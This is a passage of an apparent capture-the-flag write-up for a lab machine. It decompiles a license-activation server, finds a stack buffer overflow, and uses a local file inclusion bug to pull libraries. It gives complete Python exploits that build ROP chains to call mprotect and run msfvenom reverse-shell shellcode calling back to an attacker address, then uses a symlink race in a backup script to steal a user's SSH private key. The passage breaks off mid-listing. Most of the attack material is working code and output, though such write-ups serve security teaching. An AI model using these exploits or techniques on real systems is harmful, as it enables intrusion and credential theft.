+  if (argc != 2) {
+    error(&quot;specify port to bind to&quot;);
+  }
+  iVar1 = __isoc99_sscanf(argv[1],&amp;DAT_00102100,&amp;port);
+  if (iVar1 == -1) {
+    piVar3 = __errno_location();
+    pcVar4 = strerror(*piVar3);
+    error(pcVar4);
+  }
+  printf(&quot;[+] starting server listening on port %d\n&quot;,(uint)port);
+  server.sin_family = 2;
+  server.sin_addr = htonl(0x7f000001);
+  server.sin_port = htons(port);
+  serverfd = socket(2,1,6);
+  if (serverfd == -1) {
+    piVar3 = __errno_location();
+    pcVar4 = strerror(*piVar3);
+    error(pcVar4);
+  }
+  iVar1 = bind(serverfd,(sockaddr *)&amp;server,0x10);
+  if (iVar1 == -1) {
+    piVar3 = __errno_location();
+    pcVar4 = strerror(*piVar3);
+    error(pcVar4);
+  }
+  iVar1 = listen(serverfd,100);
+  if (iVar1 == -1) {
+    piVar3 = __errno_location();
+    pcVar4 = strerror(*piVar3);
+    error(pcVar4);
+  }
+  puts(&quot;[+] listening ...&quot;);
+  while( true ) {
+    while( true ) {
+      clientfd = accept(serverfd,(sockaddr *)&amp;clientaddr,&amp;clientaddrlen);
+      if (clientfd != -1) break;
+      fwrite(&quot;Error: accepting client\n&quot;,1,0x18,stderr);
+    }
+    inet_ntop(2,&amp;clientaddr.sin_addr,clientaddr_s,0x10);
+    printf(&quot;[+] accepted client connection from %s:%d\n&quot;,clientaddr_s,(uint)clientaddr.sin_port);
+    _Var2 = fork();
+    if (_Var2 == 0) break;
+    __sysv_signal(0x11,(__sighandler_t)0x1);
+    close(clientfd);
+  }
+  close(serverfd);
+  activate_license(clientfd);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}</code></pre>
+</doc-codeblock></div>
+<p><code v-pre>activate_license()</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void activate_license(int sockfd)
+
+{
+  int iVar1;
+  ssize_t fileSize;
+  int *piVar2;
+  char *pcVar3;
+  sqlite3_stmt *stmt;
+  sqlite3 *db;
+  uint32_t msglen;
+  char buffer [512];
+  
+  fileSize = read(sockfd,&amp;msglen,4);
+  if (fileSize == -1) {
+    piVar2 = __errno_location();
+    pcVar3 = strerror(*piVar2);
+    error(pcVar3);
+  }
+  msglen = ntohl(msglen);
+  printf(&quot;[+] reading %d bytes\n&quot;,msglen);
+  fileSize = read(sockfd,buffer,(ulong)msglen);
+  if (fileSize == -1) {
+    piVar2 = __errno_location();
+    pcVar3 = strerror(*piVar2);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_open(&quot;license.sqlite&quot;,&amp;db);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  sqlite3_busy_timeout(db,2000);
+  iVar1 = sqlite3_exec(db,
+                       &quot;CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)&quot;
+                       ,0,0,0);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_prepare_v2(db,&quot;INSERT INTO license (license_key) VALUES (?)&quot;,0xffffffff,&amp;stmt,0);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_bind_text(stmt,1,buffer,0x200,0);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_step(stmt);
+  if (iVar1 != 0x65) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_reset(stmt);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_finalize(stmt);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  iVar1 = sqlite3_close(db);
+  if (iVar1 != 0) {
+    pcVar3 = (char *)sqlite3_errmsg(db);
+    error(pcVar3);
+  }
+  printf(&quot;[+] activated license: %s\n&quot;,buffer);
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Based on the source code analysis, the first thing that called my attention was the 512 bytes buffer variable which matches with the website description of the license file size expected.
+The logic in the <code v-pre>activate_license</code> code seems to be:</p>
+<ul>
+<li>Checks if the file size is valid and store it into a variable <code v-pre>msglen</code></li>
+<li>Reads <code v-pre>msglen</code> amount of bytes from the file contents and allocate into the <code v-pre>buffer</code></li>
+</ul>
+<p>If we could manipulate the file size to something bigger then 512(buffer size) we could potentially overwrite some addresses. Here we have a buffer overflow.</p>
+<p>Continuing in the code logic, we see that it is writing the file contents to a database file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">iVar1 = sqlite3_open(&quot;license.sqlite&quot;,&amp;db);</code></pre>
+</doc-codeblock></div>
+<p>Using the LFI we can find the database file <code v-pre>license.sqlite</code>. Lets download to analyse it:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ curl 10.129.196.121/index.php?page=../license.sqlite -o license.sqlite</code></pre>
+</doc-codeblock></div>
+<p>Looking at the db file locally using <code v-pre>sqlitebrowser</code> we see one entry of 512 A&#x27;s:
+![[retired/images/image2.png]]
+It is writing 512 bytes to the database file, probably if we send 512+ bytes, the extra length will start to overwrite the memory address.</p>
+<doc-anchor-target id="buffer-overflow">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#buffer-overflow">#</doc-anchor-trigger>
+        <span>Buffer Overflow</span>
+    </h2>
+</doc-anchor-target>
+<p>What do we know so far?</p>
+<ul>
+<li>Buffer is 512+ bytes</li>
+<li>Based on an analysis of <code v-pre>activate_license.php</code> for a valid POST request we need to send the <code v-pre>license_size</code>  as 32 bit, big endian byte order before the content.</li>
+</ul>
+<doc-anchor-target id="finding-the-rip">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#finding-the-rip">#</doc-anchor-trigger>
+        <span>Finding the RIP</span>
+    </h3>
+</doc-anchor-target>
+<p>To find the RIP (rewrite point) we will create a cyclic pattern to identify how many characters we need to cause the buffer overflow.
+Lets run the binary using gdb and start creating an exploit skeleton:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ gdb activate_license
+pwndbg&gt; r 1337                                                            
+Starting program: /home/caue/htb/retired/activate/activate_license 1337   
+[Thread debugging using libthread_db enabled]                             
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+[+] starting server listening on port 1337                                                            
+[+] listening ...</code></pre>
+</doc-codeblock></div>
+<p>Exploit skeleton:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+io = remote('127.0.0.1', 1337)
+filesize = p32(800, endian='big')   # We need to pack as 32 bit big endian
+
+payload = [
+    size,
+    cyclic(1000)                    # Create a 1000 characters pattern
+]
+
+payload = b&quot;&quot;.join(payload)
+io.send(payload)</code></pre>
+</doc-codeblock></div>
+<p>Running the exploit script we get a segmentation fault in the binary:
+![[retired/images/image3.png]]</p>
+<p>Now we look at what value has settled in the RSP register, and calculate the offset to RIP.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; x/xw $rsp
+0x7fffffffdd18: 0x66616166</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ python2 -c 'from pwn import *; print cyclic_find(unhex(&quot;66616166&quot;)[::-1])'
+520</code></pre>
+</doc-codeblock></div>
+<p>So we can send 520 bytes before overwriting the RIP.
+After exiting the debugger, it would be nice to forcibly kill all web server instances:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ ps aux | grep activate_license | awk '{print $2}' | xargs kill -9</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="overwritting-the-rip">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#overwritting-the-rip">#</doc-anchor-trigger>
+        <span>Overwritting the RIP</span>
+    </h3>
+</doc-anchor-target>
+<p>Let&#x27;s check that we can actually overwrite the return address with an arbitrary value. To do this, we will write a simple Python script that will send 520 A&#x27;s + <code v-pre>0xd34dc0d3</code> and check the RIP address:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch      = 'amd64'
+context.os        = 'linux'
+context.endian    = 'little'
+context.word_size = 64
+
+filesize = p32(800, endian='big')
+
+payload = b''
+payload += size
+payload += b'A' * 520
+payload += p64(0xd34dc0d3)
+
+r = remote('localhost', 1337)
+r.sendline(payload)
+r.sendline()</code></pre>
+</doc-codeblock></div>
+<p>Once again, start the binary with gdb and run the python exploit:
+![[retired/images/image4.png]]
+Perfect!</p>
+<doc-anchor-target id="exploit-plan">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit-plan">#</doc-anchor-trigger>
+        <span>Exploit plan</span>
+    </h3>
+</doc-anchor-target>
+<p>Before we continue lets check the binary protections:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ checksec --file activate_license
+[*] '/home/caue/htb/retired/activate/activate_license'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+</doc-codeblock></div>
+<p>We need to find a way to bypass NX. The most common way is doing a return-to-libc attack but in our case it will not work as we need a reverse shell call back.
+However, there is a technique that calls <code v-pre>mprotect</code> from the libc to change the stack mode into executable. So we can inject shellcode into the stack and get a reverse shell.</p>
+<doc-anchor-target id="local---buffer-overflow">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#local---buffer-overflow">#</doc-anchor-trigger>
+        <span>Local - Buffer Overflow</span>
+    </h2>
+</doc-anchor-target>
+<p>Based on the binary protections we can see above, we will not be able to execute shellcode in the stack because of the NX protection. However, there is a couple ways to circunvent that, one of them is a called &quot;ret-to-mprotect&quot; technique.
+Basically we can use mprotect to set the stack executable again. For that, we will need some memory addresses to build a ROP chain.</p>
+<p>We can use GDB to load the binary and take a look at the memory addresses used. But first, I will turn ASLR off so it makes easier to build our exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+</doc-codeblock></div>
+<p>Load the binary into GDB:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ gdb activate_license</code></pre>
+</doc-codeblock></div>
+<p>Run the binary to listen on port 1337:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwndbg&gt; r 1337</code></pre>
+</doc-codeblock></div>
+<p>Now we can simply press CTRL + C to pause the execution and have a look at the addresses used with <code v-pre>vmmap</code>:
+<figure class="content-center">
+    <img src="images/image10.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>To build our ROP chain we will need the following address, where the arrows are pointing:</p>
+<ul>
+<li>Libc base: <code v-pre>0x7ffff7c79000</code></li>
+<li>Stack base: <code v-pre>0x7ffffffde000</code></li>
+<li>Stack end: <code v-pre>0x7ffffffff000</code></li>
+</ul>
+<p>With this addresses plus some gadgets we can make some system calls reusing small pieces of code, this technique is called ROP.</p>
+<doc-anchor-target id="finding-the-gadgets">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#finding-the-gadgets">#</doc-anchor-trigger>
+        <span>Finding the gadgets</span>
+    </h3>
+</doc-anchor-target>
+<p>In order to achieve code execution we will need the following gadgets:</p>
+<ul>
+<li>pop rdi</li>
+<li>pop rsi</li>
+<li>pop rdx</li>
+<li>mprotect</li>
+<li>jmp rsp</li>
+</ul>
+<p>Make a copy of the libc used by the binary and use <code v-pre>ropper</code> to find the gadgets needed:
+<figure class="content-center">
+    <img src="images/image11.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>With all the addresses above we just need a shellcode to be executed after the <code v-pre>jmp rsp</code> call. We can use <code v-pre>msfvenom</code> to create a reverse shell</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'
+
+Payload size: 119 bytes
+Final size of py file: 597 bytes
+shellcode =  b&quot;&quot;
+shellcode += b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
+shellcode += b&quot;\xef\xff\xff\xff\x48\xbb\xc6\x90\x7e\x57\xca\xcb\x72&quot;
+shellcode += b&quot;\xeb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
+shellcode += b&quot;\xac\xb9\x26\xce\xa0\xc9\x2d\x81\xc7\xce\x71\x52\x82&quot;
+shellcode += b&quot;\x5c\x3a\x52\xc4\x90\x7a\x85\x0a\x63\x73\x83\x97\xd8&quot;
+shellcode += b&quot;\xf7\xb1\xa0\xdb\x28\x81\xec\xc8\x71\x52\xa0\xc8\x2c&quot;
+shellcode += b&quot;\xa3\x39\x5e\x14\x76\x92\xc4\x77\x9e\x30\xfa\x45\x0f&quot;
+shellcode += b&quot;\x53\x83\xc9\xc4\xa4\xf9\x10\x78\xb9\xa3\x72\xb8\x8e&quot;
+shellcode += b&quot;\x19\x99\x05\x9d\x83\xfb\x0d\xc9\x95\x7e\x57\xca\xcb&quot;
+shellcode += b&quot;\x72\xeb&quot;</code></pre>
+</doc-codeblock></div>
+<p>Done! Lets start building our exploit chain.</p>
+<doc-anchor-target id="final-local-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#final-local-exploit">#</doc-anchor-trigger>
+        <span>Final local exploit</span>
+    </h3>
+</doc-anchor-target>
+<p>Putting all together:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+
+from pwn import *
+
+context.clear(arch='amd64')
+
+# pwndbg&gt; vmmap
+libc_base = 0x7ffff7c79000
+# pwndbg&gt; vmmap
+stack_base = 0x7ffffffde000
+
+##########################################
+#        FIND THE GADGETS ADDRESS        #
+##########################################
+# ldd activate_license | grep libc
+# cp /lib/x86_64-linux-gnu/libc.so.6 .
+# ropper --file libc.so.6 --search 'pop rdi; ret'
+pop_rdi = 0x0000000000027c3d
+# ropper --file libc.so.6 --search 'pop rdi; rsi'
+pop_rsi = 0x000000000002940f
+# ropper --file libc.so.6 --search 'pop rdi; rdx'
+pop_rdx = 0x00000000000caa2d
+# readelf -s libc.so.6 | grep mprotect
+mprotect = 0x00000000000f81e0
+# ropper --file libc.so.6 --search 'jmp rsp'
+jmp_rsp = 0x00000000000465f8
+
+filesize = p32(800, endian='big')
+
+##########################################
+#             REVERSE SHELL              #
+##########################################
+# msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'
+shellcode =  b&quot;&quot;
+shellcode += b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
+shellcode += b&quot;\xef\xff\xff\xff\x48\xbb\xc6\x90\x7e\x57\xca\xcb\x72&quot;
+shellcode += b&quot;\xeb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
+shellcode += b&quot;\xac\xb9\x26\xce\xa0\xc9\x2d\x81\xc7\xce\x71\x52\x82&quot;
+shellcode += b&quot;\x5c\x3a\x52\xc4\x90\x7a\x85\x0a\x63\x73\x83\x97\xd8&quot;
+shellcode += b&quot;\xf7\xb1\xa0\xdb\x28\x81\xec\xc8\x71\x52\xa0\xc8\x2c&quot;
+shellcode += b&quot;\xa3\x39\x5e\x14\x76\x92\xc4\x77\x9e\x30\xfa\x45\x0f&quot;
+shellcode += b&quot;\x53\x83\xc9\xc4\xa4\xf9\x10\x78\xb9\xa3\x72\xb8\x8e&quot;
+shellcode += b&quot;\x19\x99\x05\x9d\x83\xfb\x0d\xc9\x95\x7e\x57\xca\xcb&quot;
+shellcode += b&quot;\x72\xeb&quot;
+
+##########################################
+#             PAYLOAD CHAIN              #
+##########################################
+payload = b''
+payload += filesize                  # bypass filesize validation
+payload += b'A' * 520                # 520 bytes of padding
+payload += p64(libc_base + pop_rdx)
+payload += p64(0x7)                  # set mprotect to rwxp
+payload += p64(libc_base + pop_rsi)
+payload += p64(0x21000)              # pwndbg&gt; vmmap  (stack_end - stack_start)
+payload += p64(libc_base + pop_rdi)
+payload += p64(stack_base)
+payload += p64(libc_base + mprotect) # mprotect call
+payload += p64(libc_base + jmp_rsp)
+payload += shellcode                 # rev shell
+
+r = remote('localhost', 1337)
+r.sendline(payload)</code></pre>
+</doc-codeblock></div>
+<p>We can see in the image below:</p>
+<ul>
+<li>Terminal 1: GDB running the binary locally on port 1337</li>
+<li>Terminal 2: Running the python exploit</li>
+<li>Terminal 3: Netcat listener on port 1234
+<figure class="content-center">
+    <img src="images/image12.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</li>
+</ul>
+<p>After running the python script we get our reverse shell back:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired/activate$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.104] from (UNKNOWN) [192.168.1.104] 41374
+
+id
+uid=1000(caue) gid=1000(caue) groups=1000(caue),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(wireshark),121(bluetooth),131(scanner),139(kaboxer)</code></pre>
+</doc-codeblock></div>
+<p>Perfect, it works locally, now we need to apply that to the target!</p>
+<doc-anchor-target id="remote---buffer-overflow">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#remote---buffer-overflow">#</doc-anchor-trigger>
+        <span>Remote - Buffer Overflow</span>
+    </h2>
+</doc-anchor-target>
+<p>In order to exploit this binary remotely we will need to update the exploit to match the target environment.</p>
+<doc-anchor-target id="updating-the-addresses">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#updating-the-addresses">#</doc-anchor-trigger>
+        <span>Updating the addresses</span>
+    </h3>
+</doc-anchor-target>
+<p>The first thing we need to do is using the LFI to download the libraries used with the binary so we can extract the addresses needed for the ROP chain.
+Looking at the <code v-pre>http://10.10.11.154/index.php?page=/proc/424/maps</code> we can see the libraries loaded:
+<figure class="content-center">
+    <img src="images/image9.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can focus on these 2 libraries highlighted above and the stack address.
+We will use <code v-pre>libc-2.31.so</code> to extract most of the addresses for the ROP chain, however we will need a <code v-pre>jmp rsp</code> address that it does not exist in this library. Thats when <code v-pre>libsqlite3.so.0.8.6</code> comes in handy. Also the stack start, stack end will be used.</p>
+<p>We can easily download the libraries using curl:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
+$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6</code></pre>
+</doc-codeblock></div>
+<p>Instead of typing all the ROP addresses manually, we will use the <code v-pre>ROP</code> function from pwntools. So we can simply load a library like that:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">libc = ELF('./libc.so.6', checksec=False)
+rop = ROP([libc])</code></pre>
+</doc-codeblock></div>
+<p>And simply search for gadgets like that:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pop_rdi = rop.rdi[0]                        
+pop_rsi = rop.rsi[0]                        
+pop_rdx = rop.rdx[0]                        
+jmp_rsp = rop.jmp_rsp[0]                    </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="final-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#final-exploit">#</doc-anchor-trigger>
+        <span>Final exploit</span>
+    </h3>
+</doc-anchor-target>
+<p>Using the information we got from the LFI and using the libraries we just downloaded we can get to a final exploit like below:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+
+import requests
+from pwn import *
+
+context.clear(arch='amd64')
+
+#########################################
+#   FIND THE LIBS AND STACK ADDRESSES   #
+#########################################
+# curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
+libc = ELF('./libc-2.31.so', checksec=False)
+libc.address = 0x7f64e6b94000               # LFI: /proc/402/maps
+
+# curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6
+libsqlite3 = ELF('./libsqlite3.so.0.8.6', checksec=False)
+libsqlite3.address = 0x7f64e6d59000         # LFI: /proc/402/maps
+stack_base = 0x7ffc836e2000                 # LFI: /proc/402/maps
+stack_end = 0x7ffc83703000                  # LFI: /proc/402/maps
+stack_size = stack_end - stack_base         # 0x21000
+
+##########################################
+#             REVERSE SHELL              #
+##########################################
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f py -b '\x00'
+buf =  b&quot;&quot;
+buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
+buf += b&quot;\xef\xff\xff\xff\x48\xbb\x50\xa3\x78\xc8\x1f\xfd\xf8&quot;
+buf += b&quot;\x70\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
+buf += b&quot;\x3a\x8a\x20\x51\x75\xff\xa7\x1a\x51\xfd\x77\xcd\x57&quot;
+buf += b&quot;\x6a\xb0\xc9\x52\xa3\x7c\x1a\x15\xf7\xf6\x73\x01\xeb&quot;
+buf += b&quot;\xf1\x2e\x75\xed\xa2\x1a\x7a\xfb\x77\xcd\x75\xfe\xa6&quot;
+buf += b&quot;\x38\xaf\x6d\x12\xe9\x47\xf2\xfd\x05\xa6\xc9\x43\x90&quot;
+buf += b&quot;\x86\xb5\x43\x5f\x32\xca\x16\xe7\x6c\x95\xf8\x23\x18&quot;
+buf += b&quot;\x2a\x9f\x9a\x48\xb5\x71\x96\x5f\xa6\x78\xc8\x1f\xfd&quot;
+buf += b&quot;\xf8\x70&quot;
+
+##########################################
+#        FIND THE GADGETS ADDRESS        #
+##########################################
+rop = ROP([libc, libsqlite3])               # Load the libs to start ROP chain
+# search ROP Gadgets                   
+mprotect = libc.symbols['mprotect']         # 0xf8c20   readelf -s libc.so.6 | grep mprotect
+pop_rdi = rop.rdi[0]                        # 0x26796   ropper -f libc.so.6 --search &quot;pop rdi; ret&quot;
+pop_rsi = rop.rsi[0]                        # 0x2890f   ropper -f libc.so.6 --search &quot;pop rsi; ret&quot;
+pop_rdx = rop.rdx[0]                        # 0xcb1cd   ropper -f libc.so.6 --search &quot;pop rdx; ret&quot;
+jmp_rsp = rop.jmp_rsp[0]                    # 0xd431d   ropper -f libsqlite3.so.0.8.6 --search &quot;jmp rsp&quot;
+
+offset = 520
+
+##########################################
+#            PAYLOAD CHAIN               #
+##########################################
+payload = b'A' * offset
+#int mprotect(void *addr, size_t len, int prot);
+payload += p64(pop_rdi) + p64(stack_base)       # addr = Begin of Stack
+payload += p64(pop_rsi) + p64(stack_size)       # len = size of Stack
+payload += p64(pop_rdx) + p64(7)                # prot = Permission 7 -&gt; rwx
+payload += p64(mprotect)                        # call mprotect
+payload += p64(jmp_rsp)                         # jmp rsp
+payload += buf                                  # reverse shell
+
+# Save payload to a file
+write('payload.txt', payload)
+
+# Upload the payload
+test_url = &quot;http://10.10.11.154/activate_license.php&quot;
+test_response = requests.post(test_url, files = {&quot;licensefile&quot;: payload})
+if test_response.ok:
+    print(&quot;Payload sent successfully!&quot;)
+    print(test_response.text)
+else:
+    print(&quot;Something went wrong!&quot;)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="www-data-user">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#www-data-user">#</doc-anchor-trigger>
+        <span>WWW-DATA user</span>
+    </h2>
+</doc-anchor-target>
+<p>After the binary exploitation successfully done we get a sheel as <code v-pre>www-data</code>.
+<figure class="content-center">
+    <img src="images/image13.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="privilege-escalation-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation-1">#</doc-anchor-trigger>
+        <span>Privilege escalation 1</span>
+    </h3>
+</doc-anchor-target>
+<p>Enumerating the system we find an interesting bash script <code v-pre>/usr/bin/webbackup</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+set -euf -o pipefail
+cd /var/www/
+SRC=/var/www/html
+DST=&quot;/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip&quot;
+/usr/bin/rm --force -- &quot;$DST&quot;
+/usr/bin/zip --recurse-paths &quot;$DST&quot; &quot;$SRC&quot;
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ &quot;$KEEP&quot; -le 0 ]; then
+            /usr/bin/rm --force -- &quot;$backup&quot;
+        fi
+        KEEP=&quot;$((KEEP-1))&quot;
+    done</code></pre>
+</doc-codeblock></div>
+<p>If we look at <code v-pre>/var/www</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">www-data@retired:/var/www$ ls -la
+total 2008
+drwxrwsrwx  3 www-data www-data   4096 Apr 29 04:20 .
+drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
+-rw-r--r--  1 www-data www-data 505153 Apr 29 04:18 2022-04-29_04-18-04-html.zip
+-rw-r--r--  1 dev      www-data 505153 Apr 29 04:18 2022-04-29_04-18-06-html.zip
+-rw-r--r--  1 dev      www-data 505153 Apr 29 04:19 2022-04-29_04-19-06-html.zip
+-rw-r--r--  1 dev      www-data 505153 Apr 29 04:20 2022-04-29_04-20-06-html.zip
+drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
+-rw-r--r--  1 www-data www-data  12288 Apr 29 04:05 license.sqlite</code></pre>
+</doc-codeblock></div>
+<p>It seems that the user <code v-pre>dev</code> is making use of this script at every minute to make a backup of the web files.</p>
+<p>Create symlink to user <code v-pre>dev</code> SSH private key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key
+www-data@retired:/var/www/html$ ls -la
+total 48
+drwxrwsrwx 5 www-data www-data  4096 Apr 29 04:29 .
+drwxrwsrwx 3 www-data www-data  4096 Apr 29 04:29 ..
+-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
+drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
+-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
+drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
+-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
+lrwxrwxrwx 1 www-data www-data    21 Apr 29 04:29 dev_key -&gt; /home/dev/.ssh/id_rsa
+-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
+drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js</code></pre>
+</doc-codeblock></div>
+<p>It is a racing condition as the <code v-pre>webbackup</code> script will do a cleanup before zipping the files. We need to constantly being creating this symbolic link when the time comes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
+ln: failed to create symbolic link 'dev_key': File exists                                                                                                
+www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
+ln: failed to create symbolic link 'dev_key': File exists
+...
+...</code></pre>
+</doc-codeblock></div>
+<p>Until finally the script is triggered and we can unzip the backup file containing the user ssh key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">www-data@retired:/var/www$ mkdir test
+www-data@retired:/var/www$ cp 2022-04-29_04-33-06-html.zip test/
+www-data@retired:/var/www$ cd test/
+www-data@retired:/var/www/test$ unzip 2022-04-29_04-33-06-html.zip
+Archive:  2022-04-29_04-33-06-html.zip 
+   creating: var/www/html/
+   creating: var/www/html/js/
+  inflating: var/www/html/js/scripts.js  
+  inflating: var/www/html/dev_key    
+  inflating: var/www/html/activate_license.php  
+   creating: var/www/html/assets/
+  inflating: var/www/html/assets/favicon.ico  
+   creating: var/www/html/assets/img/
+  inflating: var/www/html/assets/img/close-icon.svg  
+  inflating: var/www/html/assets/img/navbar-logo.svg  
+   creating: var/www/html/assets/img/about/
